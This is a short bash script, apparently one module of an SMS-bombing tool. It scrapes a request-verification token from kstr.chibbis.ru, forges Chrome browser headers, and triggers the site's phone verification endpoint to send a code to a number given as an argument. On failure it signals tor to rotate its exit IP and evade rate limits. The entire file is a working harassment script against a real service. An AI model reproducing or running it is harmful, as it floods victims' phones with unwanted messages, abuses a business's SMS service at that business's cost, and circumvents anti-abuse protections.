#!/bin/bash

PHONE="$(echo "$1" | sed -E 's/^\+7([0-9]{3})([0-9]{3})([0-9]{4})$/7(\1)+\2-\3/')"
echo "+$PHONE"

COOKIEFILE="$RANDOM"cookie.txt

TOKEN=$(curl -s --retry 3 'https://kstr.chibbis.ru/' -c "$COOKIEFILE" -b "$COOKIEFILE" | grep 'requestverificationcode' | grep '__RequestVerificationToken' | sed -E 's/.*type="hidden" value="([^"]+)".*/\1/')

RESULT=$(curl -s --retry 3 'https://kstr.chibbis.ru/account/requestverificationcode' \
  -c "$COOKIEFILE" -b "$COOKIEFILE" \
  -H 'authority: kstr.chibbis.ru' \
  -H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"' \
  -H 'dnt: 1' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36' \
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'accept: */*' \
  -H 'x-requested-with: XMLHttpRequest' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'origin: https://kstr.chibbis.ru' \
  -H 'sec-fetch-site: same-origin' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-dest: empty' \
  -H 'referer: https://kstr.chibbis.ru/contact' \
  -H 'accept-language: ru-UA,ru;q=0.9' \
  --data-raw "PhoneNumber=%2B$PHONE&ResendToken=&__RequestVerificationToken=$TOKEN")

rm -rf "$COOKIEFILE"
echo "$RESULT"

if [ "$(echo "$RESULT" | grep -c '"Result":"ok"')" = "0" ]; then
  pkill -sighup tor 2>/dev/null
fi
